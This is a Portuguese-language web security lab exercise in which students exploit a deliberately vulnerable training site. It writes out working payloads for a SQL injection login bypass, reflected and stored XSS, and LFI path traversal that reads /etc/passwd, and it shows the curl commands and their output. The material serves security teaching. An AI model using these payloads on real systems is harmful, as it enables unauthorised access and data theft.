FASE 3 — EXPLORAÇÃO DE VULNERABILIDADES WEB
03

SQLi, XSS e LFI no site UMC Lab

Explore as vulnerabilidades encontradas. Cada teste demonstra uma classe de ataque real.

SQLiXSSLFIbypass login
⏱ 30 min
3.1
SQL Injection — bypass de login (V3)
BROWSER — http://localhost:8080/login.php
Usuário:' OR '1'='1
Este payload faz a query SQL virar sempre verdadeira. A lógica: WHERE usuario='' OR '1'='1' AND senha='...'
Senha:qualquer coisa
→ Login realizado! Redirecionado para dashboard.php
💡 TAMBÉM FUNCIONA NO KALI curl -X POST http://192.168.100.10/login.php -d "usuario=' OR '1'='1&senha=x" -v
3.2
XSS Refletido — campo de busca (V2)
BROWSER OU KALI
URL:http://localhost:8080/index.php?q=<script>alert('XSS UMC')</script>
O input é refletido sem sanitização no HTML. O browser executa o JavaScript injetado.
→ Pop-up com "XSS UMC" aparece no browser!
3.3
XSS Persistente — comentários (V5)
BROWSER — http://localhost:8080/comentarios.php
Comentário:<img src=x onerror="alert('XSS Persistente')">
Enviado via formulário. O script fica salvo e executa para TODOS que visitam a página — mais perigoso que o refletido.
→ Alert dispara para qualquer pessoa que abrir /comentarios.php!
3.4
LFI — Local File Inclusion (V4)
KALI — root@kali-atacante
root@kali#curl "http://192.168.100.10/busca.php?page=../../../etc/passwd"
Path traversal: navega para fora do webroot usando ../ e inclui o arquivo de usuários do Linux.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
← conteúdo do /etc/passwd do container!
